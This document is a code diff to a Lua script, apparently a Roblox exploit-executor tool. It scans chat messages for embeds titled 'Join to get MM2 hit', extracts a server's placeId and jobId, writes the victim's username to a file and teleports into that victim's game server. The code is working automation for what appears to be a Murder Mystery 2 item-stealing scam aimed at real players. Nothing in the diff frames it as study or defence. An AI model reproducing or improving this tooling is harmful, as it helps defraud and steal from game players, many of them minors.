@@ -128,17 +128,19 @@ local function autoJoin()
             return
         end
         for _, message in ipairs(messages) do
-            if message.content ~= "" then
-                local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
-                if placeId and jobId then
-                    local victimUsername = message.embeds[1].fields[1].value
+            if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
+                if message.embeds[1].title:find("Join to get MM2 hit") then
+                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
+                    if placeId and jobId then
+                        local victimUsername = message.embeds[1].fields[1].value
 
-                    if didVictimLeave or timer > 5 then
-                        if not table.find(joinedIds, tostring(message.id)) then
-                            saveJoinedId(tostring(message.id)) -- Save this ID to the list
-                            writefile("user.txt", victimUsername)
-                            game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
-                            return
+                        if didVictimLeave or timer > 5 then
+                            if not table.find(joinedIds, tostring(message.id)) then
+                                saveJoinedId(tostring(message.id)) -- Save this ID to the list
+                                writefile("user.txt", victimUsername)
+                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
+                                return
+                            end
                         end
                     end
                 end
